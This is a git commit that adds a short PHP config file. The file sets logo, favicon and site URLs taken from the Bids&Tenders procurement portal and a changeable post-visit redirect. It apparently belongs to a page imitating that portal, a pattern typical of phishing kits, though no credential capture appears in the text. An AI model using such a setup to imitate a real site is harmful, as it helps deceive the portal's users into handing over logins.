ade56ba77d78383105e1003a381a0ed1e94d171b
pwcsuper111 <pwcsuper111@gmail.com>
2026-06-15 04:14:11 -0700

    Create config.php

---
+++ config.php
@@ -0,0 +1,8 @@
+<?php
+
+define('LOGO_URL', 'https://bids.bidsandtenders.ca/Resources/content/StandardTemplate/resources/Logo/BT_NewLogo_NameandSymol-colored.png');
+define('FAVICON_URL', 'https://bids.bidsandtenders.ca/Resources/content/StandardTemplate/favicons/favicon-32x32.png');
+define('SITE_URL', 'https://bids.bidsandtenders.ca/');
+
+// ===== CHANGE YOUR REDIRECT URL HERE =====
+define('REDIRECT_URL', 'https://youtube.com');
